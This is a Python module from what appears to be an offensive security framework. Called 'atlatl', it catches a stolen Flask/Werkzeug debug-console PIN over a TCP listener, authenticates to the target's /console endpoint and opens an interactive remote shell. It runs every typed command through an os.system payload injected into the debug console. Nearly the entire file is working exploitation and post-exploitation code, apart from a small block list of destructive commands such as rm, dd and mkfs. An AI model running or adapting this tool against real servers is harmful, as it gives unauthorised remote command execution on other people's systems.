from core.vmnf_payloads import VMNFPayloads
from random import randint,random,choice
from requests.utils import requote_uri
from neotermcolor import colored,cprint
from urllib.parse import urlparse
from res.stage import stager
from urllib.parse import quote
from datetime import datetime
from bs4 import BeautifulSoup
from time import sleep
import socketserver
import collections
import requests
import sys
import json
import os


class siddhi:
    module_information = collections.OrderedDict()
    module_information = {
        "Name":            "atlatl",
        "Info":            "Flask Console Hook",
        "Category":        "Framework",
        "Framework":       "Flask",
        "Type":            "persistence",
        "Module":          "siddhis/atlatl",
        "Author":          "s4dhu <s4dhul4bs[at]prontonmail[dot]ch",
        "Brief":           "Flask Console Hook Tool",
        "Description":
        """

        \rThis module is intended to act as a specific listener to capture and
        \rauthenticate Flask debug console sessions, and also act as a stable
        \rcommunication channel with the affected server. In this first version
        \ratlatl works in conjunction with the flask_pinstealer payload, but new
        \rpossibilities are on the way.
        """

    }

    def __init__(self, **vmnf_handler):
        self.vmnf_handler = vmnf_handler
        self.siddhi_name = colored('4tl4tl','blue')

    class TCPHandler(socketserver.BaseRequestHandler):
        def handle(self):
            self.siddhi_name = colored('4tl4tl','blue')
            _set_ = stager(**{'session': False}).check_forward()
            
            if _set_ is None:
                print('[{}]➳ Failure!\n'.format(self.siddhi_name))
                sys.exit()

            if _set_.get('forward_session').strip() == 'atlatl':
                _set_ = urlparse(_set_.get('target_url'))
                target_url = (_set_.scheme + '://' + _set_.netloc)

            self.data = self.request.recv(1024).strip()
            if 'PIN' in self.data.decode():
                pin = self.data.decode().split(':')[1].replace("']",'').replace("\\n",'').strip()
                print('[{}]➳ PIN caught: {}'.format(
                    self.siddhi_name,colored(pin,'white',attrs=['bold'])
                    )
                )
                sleep(1)
                
                # this will be used in future versions
                #self.request.sendall('blas1'.encode()) 
                siddhi().console_hook(target_url,pin)
                setattr(self.server, '_BaseServer__shutdown_request', True)

    def get_secret(self,response):
        soup = BeautifulSoup(response.content, 'lxml')
        page_head = soup.head.text

        return (page_head[
            page_head.find('SECRET')-1:page_head.find(';')
                ].split('=')[1].replace('"','').strip()
        )

    def request_url(self,target_url,**headers):
        session = requests.session()
        
        try:
            return (session.get(
                target_url,
                headers=headers,
                verify=False,timeout=10
                )
            )
        except requests.exceptions.ReadTimeout:
            return False
        except requests.exceptions.ConnectionError:
            return False
    
    def show_cmd_output(self,response):
        if not response:
            print('[{}]➳ Something went wrong. maybe you ran a weirdo cmd that confused the parser'.format(self.siddhi_name))
            return False

        if response.status_code == 200:
            out_text = ''
            soup = BeautifulSoup(response.content, 'lxml')
            cmd_response = soup.find_all('span', {'class': 'string'})
            p_response = cmd_response
            resp_l = len(cmd_response)
            
            if cmd_response is None:
                print('[{}]➳ Server response doesnt match with a expected one.'.format(
                    self.siddhi_name
                    )
                )
                return False
            
            if resp_l > 1:
                p_response = [a.string.replace("\\n'",'').replace("'",'')\
                    for a in cmd_response\
                        if a.string is not None]

            print()
            for line in p_response:
                try:
                    out_text = ('     ' + line.get_text())
                except AttributeError:
                    
                    line = str(line).replace(
                            "\\n'",'').replace(
                                    "'",'').strip()

                    out_text = ('     ' + line)
                out_text = out_text.replace('\\n','').replace("'",'')   
                cprint(out_text, 'green')

            print()
            return out_text

    def console_hook(self,target,pin):
        
        target_url= "{}/console".format(target)
        auth_part= "?__debugger__=yes&cmd=pinauth&pin={}&s={}"
        cmd_part="?__debugger__=yes&cmd={}&frm=0&s={}"
    
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0", 
            "Accept": "application/json, text/javascript, */*; q=0.01", 
            "Accept-Language": "en-US,en;q=0.5", 
            "Accept-Encoding": "gzip, deflate", 
            "X-Requested-With": "XMLHttpRequest", 
            "Connection": "close", 
            "Referer": target_url
        }

        response = self.request_url(target_url,**headers)
        
        if not response:
            print('[{}]➳ Connection failure. Please, check target url and try again'.format(
                self.siddhi_name
                )
            )
            return False

        secret = self.get_secret(response).strip()
    
        if not secret:
            print('[{}]➳ Console secret was not found, check target URL'.format(self.siddhi_name))
            return False

        if not pin:
            print('[{}]➳ Missing console PIN'.format(self.siddhi_name))
            return False

        auth_url = target_url + auth_part.format(pin,secret)
        response = self.request_url(auth_url,**headers)
    
        if not response:
            print('[{}]➳ We got some problems during initial steps. Make sure the target and port are correct.'.format(self.siddhi_name))
            sys.exit(1)

        if response.status_code == 200:
            try:
                auth_status = (response.json())
            except json.decoder.JSONDecodeError:
                print('[{}]➳ An error ocurred during parsing response'.format(self.siddhi_name))
                return False

            if auth_status.get('auth'):
                print('[{}]➳ Successfuly authenticated at {}'.format(self.siddhi_name,datetime.now()))
                sleep(1)
                for k,v in (response.headers.items()):
                    print('     + {}: {}'.format(k,v))
        else:
            print('[{}]➳ Not authenticated'.format(self.siddhi_name))
            return False
    
        session_cookie = response.headers.get('Set-Cookie') 
    
        if session_cookie is None:
            print('[{}] Authentication error: The PIN entered does not seem fresh\n'.format(self.siddhi_name))
            return False

        hl_cookie = colored(session_cookie,'white', attrs=['bold'])
        print('\n[{}]➳ Using cookie {}'.format(self.siddhi_name,hl_cookie))
        sleep(1)
    
        # update headers with set-cookie session
        headers.update({'Cookie':session_cookie})
        hl_sec = colored(secret,'white', attrs=['bold'])
        print('[{}]➳ Using secret {}'.format(self.siddhi_name,hl_sec))
        sleep(1)
        
        id_url = target_url + cmd_part.format(self.get_payload('hostname'),secret)
        response = self.request_url(id_url,**headers)
        hostname = colored(self.show_cmd_output(response).strip(),'white')
        atlatl_flag = colored("تیر {}".format(self.siddhi_name),'red') 

        if response:
            dang_cmds = [
                'danger','rm', 
                'dd', 'mkfs', 
                '/dev/null', 
                'mv','{:|:'
            ] 

            while True:
                try:
                    cmd = input(colored('\n{}@{} ➳ '.format(
                        atlatl_flag,hostname), 'blue', attrs=[])
                    )

                except KeyboardInterrupt:
                    continue
                except EOFError:
                    continue

                if not cmd:
                    continue
                if cmd == 'exit':
                    sys.exit(0)

                if [c for c in cmd.split() if c in dang_cmds]:
                    exp = colored("""
                            ,--.!,
                        __/    -*-
                      ,d08b.   '|`
                      00SOMM   {}
                      `9MMP'""".format(cmd), "white")

                    cprint("""\n\tTake it easy sadhu, you could destroy the target. 
                    \r\tIf you're running it in localhost
                    \r\t    so you could destroy your own SO
                    {}

                    """.format(exp), 'red')
                    continue
                
                cmd = (" "*randint(10,100)) \
                        + cmd + (" "*randint(11,56))

                response = self.request_url(
                    target_url + \
                    cmd_part.format(
                        self.get_payload(cmd),
                        secret),
                    **headers
                )
                if not self.show_cmd_output(response):
                    continue

    def get_payload(self, cmd):
        return requote_uri(quote(
            "__import__('os').system('{} >/tmp/.x');\
            open('/tmp/.x').readlines()".format(cmd)
            ) 
        )

    def load(self):
        s='➳ ➵'
        print('\n\n')
        for c in range(15):
            shot = '''\t   ➴  ➶ ➷➹'''*c + s * c 
            os.system('clear')
            cprint(shot,choice(
                ['red','blue','white','yellow','magenta','cyan']),
                attrs=['blink','bold']
            )
            print()
            sleep(0.07)

    def start(self,port=False):
        mis_reqs = False
        hlt = colored('--target-url', 'white')
        hlp = colored('--console-pin', 'white')

        if not self.vmnf_handler.get("session_mode"):
            if self.vmnf_handler['local_port']\
                or self.vmnf_handler['local_port']:
                
                cprint("""\n[{}]➳ Parameters such as --local-host or local-port are not necessary in this mode""".format(
                    self.siddhi_name,
                    ), 'cyan'
                ) 

            if not self.vmnf_handler.get('console_pin'):
                mis_reqs = True
                hlp = colored('--console-pin', 'red', attrs=['bold'])

            if not self.vmnf_handler.get('target_url'):
                mis_reqs = True
                hlt = colored('--target-url', 'red', attrs=['bold'])
            
            if mis_reqs:
                cprint("""[{}]➳ In this mode you need to specify {} and {}\n\n""".format(
                    self.siddhi_name,
                    hlt, hlp
                    ), 'cyan'
                ) 

                sys.exit()
            
            self.console_hook(
                self.vmnf_handler.get("target_url"),
                self.vmnf_handler.get("console_pin")
            )
            
        
        
        self.load()
        os.system('clear')

        cprint("""
             _|      _|              _|      _|
   _|_|_|  _|_|_|_|  ➵|    _|_|➵|  _|_|_|_|  _| ➵
 ➵|    _|    _|      _|  _|    ➵|    _|      ➵|  ➵
 _|    _|    _|      _|  _|    ➵|    ➵|      _|     ➵ ➵
   _|_|➵|      _|➵|  _|    _|_|➵|      _|_|  _|

        """,'blue',attrs=['bold'])

        
        self.vmnf_handler = stager(**self.vmnf_handler).check_forward()
        
        if not self.vmnf_handler:
            print('[{}] An error occurred while loading session.'.format(
                self.siddhi_name,call_siddhi
                )
            )
            return False

        call_siddhi = colored(self.vmnf_handler.get('module_run'), 'blue')
        
        print('[{}]➳ Loading settings from {} session...'.format(
            self.siddhi_name,call_siddhi
            )
        )
        sleep(1)

        target = self.vmnf_handler.get('local_host','127.0.0.1')
        
        try:
            port = int(self.vmnf_handler.get('local_port',9000))
        except ValueError:
            print('\n[{}] Invalid port type: {}\n'.format(self.siddhi_name,
                colored(self.vmnf_handler.get('local_port',9000),'red')
                )
            )
            return False

        print('[{}]➳ Listening at {} {}...'.format(
            self.siddhi_name,
            colored(target,'white', attrs=['bold']),
            colored(port, 'white', attrs=['bold'])
            )
        )
        try:
            with socketserver.TCPServer((target, port), self.TCPHandler) as server:
                server.serve_forever()
        except OSError:
            port = int(input('[{}]➳ Choose another port to start listener: '.format(self.siddhi_name)))
            self.start(port)

